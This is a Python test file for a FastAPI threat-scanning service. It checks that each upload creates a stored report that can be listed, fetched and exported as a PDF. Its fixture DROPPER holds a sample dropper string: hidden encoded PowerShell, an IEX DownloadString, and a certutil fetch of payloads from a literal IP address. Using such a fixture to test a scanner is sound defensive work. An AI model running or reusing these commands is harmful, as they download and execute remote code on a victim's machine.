"""Milestone 3: persisted per-scan threat prediction reports (list/get/pdf).

Every pipeline scan (upload) now creates a report automatically, so a past
scan's full analysis and PDF can be retrieved later by report_id without the
client holding any state -- previously the PDF could only be regenerated from
a client-held ``AnalysisResult``.
"""

import io

from fastapi.testclient import TestClient

from app.main import app
from app.modules.reports.service import reports_service

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)


def _headers(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def test_upload_creates_a_retrievable_report():
    headers = _headers()
    before = len(reports_service.list_reports())

    upload = client.post(
        "/api/v1/files/upload",
        files={"file": ("retrievable.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=headers,
    )
    assert upload.status_code == 201
    analysis = upload.json()

    reports = reports_service.list_reports()
    assert len(reports) == before + 1
    latest = reports[0]
    assert latest.filename == "retrievable.bin"
    assert latest.file_hash == analysis["hashes"]["sha256"]


def test_list_reports_endpoint_requires_auth():
    resp = client.get("/api/v1/reports")
    assert resp.status_code == 401


def test_list_and_get_and_download_previous_report():
    headers = _headers()
    upload = client.post(
        "/api/v1/files/upload",
        files={"file": ("round-trip.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=headers,
    )
    assert upload.status_code == 201

    listing = client.get("/api/v1/reports", headers=headers)
    assert listing.status_code == 200
    reports = listing.json()
    assert any(r["filename"] == "round-trip.bin" for r in reports)
    report_id = next(r["report_id"] for r in reports if r["filename"] == "round-trip.bin")

    status_resp = client.get(f"/api/v1/reports/{report_id}", headers=headers)
    assert status_resp.status_code == 200
    assert status_resp.json()["filename"] == "round-trip.bin"

    pdf = client.get(f"/api/v1/reports/{report_id}/pdf", headers=headers)
    assert pdf.status_code == 200
    assert pdf.headers["content-type"] == "application/pdf"
    assert pdf.content[:4] == b"%PDF"


def test_download_pdf_for_unknown_report_id_is_404():
    resp = client.get("/api/v1/reports/does-not-exist/pdf", headers=_headers())
    assert resp.status_code == 404
